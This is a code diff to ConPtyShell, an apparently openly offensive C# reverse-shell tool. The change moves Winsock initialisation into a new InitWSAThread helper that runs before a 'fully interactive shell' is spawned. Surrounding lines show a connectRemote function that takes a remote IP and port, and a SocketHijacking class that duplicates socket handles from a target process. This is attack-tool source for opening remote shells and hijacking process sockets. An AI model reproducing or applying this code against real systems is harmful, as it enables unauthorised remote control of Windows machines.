@@ -514,9 +514,6 @@ public static class SocketHijacking {
             return targetSocketHandle;
         else
         {
-            WSAData data;
-            if (WSAStartup(2 << 8 | 2, out data) != 0)
-                throw new ConPtyShellException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
             foreach (IntPtr socketHandle in targetProcessSockets) {
                 IntPtr dupSocketHandle = IntPtr.Zero;
                 WSAPROTOCOL_INFO wsaProtocolInfo = new WSAPROTOCOL_INFO();
@@ -798,7 +795,13 @@ public static class ConPtyShell
     
     [DllImport("ntdll.dll")]
     private static extern uint NtResumeProcess(IntPtr processHandle);
-    
+
+    private static void InitWSAThread() {
+        WSAData data;
+        if (WSAStartup(2 << 8 | 2, out data) != 0)
+            throw new ConPtyShellException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
+    }
+
     private static IntPtr connectRemote(string remoteIp, int remotePort)
     {
         int port = 0;
@@ -809,12 +812,6 @@ public static class ConPtyShell
             port = Convert.ToInt32(remotePort);
         } catch {
             throw new ConPtyShellException("Specified port is invalid: " + remotePort.ToString());
-        }
-
-        WSAData data;
-        if( WSAStartup(2 << 8 | 2, out data) != 0 ) {
-            error = WSAGetLastError();
-            throw new ConPtyShellException(String.Format("WSAStartup failed with error code: {0}", error));
         }
 
         IntPtr socket = IntPtr.Zero;
@@ -1030,8 +1027,10 @@ public static class ConPtyShell
         CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
         // comment the below function to debug errors
         InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);
-        
-        if(conptyCompatible){
+        // init wsastartup stuff for this thread
+        InitWSAThread();
+
+        if (conptyCompatible){
             Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell\r\n");
             if(upgradeShell){
                 List<IntPtr> socketsHandles = new List<IntPtr>();
